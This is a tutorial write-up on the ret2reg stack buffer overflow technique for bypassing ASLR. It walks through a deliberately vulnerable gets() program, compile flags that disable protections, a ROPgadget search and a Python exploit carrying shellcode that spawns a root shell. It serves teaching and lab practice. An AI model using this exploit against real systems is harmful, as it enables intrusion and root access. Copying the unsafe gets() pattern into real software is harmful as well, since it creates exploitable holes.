# Exploits
## Stack buffer overflow : Return to registry (ret2reg) while injecting shellcode
## Required to understand : Stack buffer overflow for normal shellcode injection and Stack buffer overflow for return oriented programming
## Bypasses protection : ASLR
ret2reg is a technique which allows the attacker to jump to arbitrary shellcode that he've placed on the buffer without even knowing the address of the shellcode  
But ret2reg does not stops at jumping at shellcode, here's the idea behind it : Let's say a register (usually eax) contains a useful memory location in a segment that is executable, such as the register is a pointer (for example a memory location that is randomised by ASLR), then if we find a gadget that can jump to this register such as `jump <register>` or `call <register>` then we can jump to it  
For this example, we will abuse the fact that `gets` returns the address of the char array (`char[]`) which the function has copied data into  
In C, when a function returns, it will set `EAX` (or `RAX` in 64 bits) to the value or the pointer that it has returned  
It's awesome because in this case, all we have to do is to inject the shellcode into the buffer followed by a nop slide to fill the rest of it, then we can just overwrite `EIP` with the address of the gadget that will call/jump to `EAX` (or `RAX`)  
Let's write a simple program in 32 bits that uses gets and that can thus trigger a stack buffer overflow :
```c
#include <stdio.h>
#include <stdlib.h>

void vuln()
{
	char buffer[64];
	gets(buffer);
}
int main()
{
	vuln();
}
```
To compile it, i used :
```
gcc <source code file>.c -o <executable> -fno-stack-protector -m32 -no-pie -z execstack
```
I didn't disable ASLR  

First we need the address of the gadgets that calls/jump to `EAX`, i used ROPgadget for that :
```
ROPgadget --binary vuln | grep "call eax" # or grep "jmp eax"
```
It gived me what i'm looking for :
```
0x08049019 : call eax
```
So i have a `call eax` at `0x08049019`  

Here's a reliale exploit for it (comments are fair enough) :
```python
import struct

shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
shellcode += "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
shellcode += "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
# or any other shellcode

payload = shellcode # => BUFFER
payload += "\x90"*(64-len(shellcode)) # we fill the rest of the buffer with NOPs
payload += "A"*(76-64) # offset between the buffer and EIP
payload += struct.pack("I", 0x08049019) # gadget : call eax (or jmp eax) | ROPgadget --binary vuln | grep "call eax" # or grep "jmp eax"
# we call eax because it contains the address of the buffer which gets has returned
print(payload)
```
Then let's use it :
```
(python exploit.py ; cat) | <executable>
```
A shell just spawned, awesome ! :
```bash
whoami
root
id    
uid=0(root) gid=0(root) groups=0(root),142(kaboxer)
echo "i just've pwned you" > pwned
```
Thanks for have reading this
